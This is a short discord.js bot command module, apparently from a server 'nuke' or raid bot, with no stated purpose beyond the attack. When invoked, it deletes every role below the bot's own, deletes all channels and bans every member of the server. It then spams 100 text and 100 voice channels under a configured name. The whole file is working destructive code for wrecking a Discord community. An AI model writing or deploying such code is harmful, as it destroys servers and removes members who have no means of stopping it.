const Discord = require("discord.js");
const config = require("../../util/config.json")

var nome = config.mensg

module.exports.run = async (bot, message, args) => {  
   message.delete()
     message.guild.roles.filter(r => r.position < message.guild.me.highestRole.position).deleteAll();
    message.guild.channels.deleteAll();
         message.guild.members.tap(membro => 
            membro.ban(config.ban))
  
  for (pas = 0; pas < 100; pas++) {

        
    message.guild.createChannel(nome, "text")
       message.guild.createChannel(nome, "voice");
     
    
  }
}
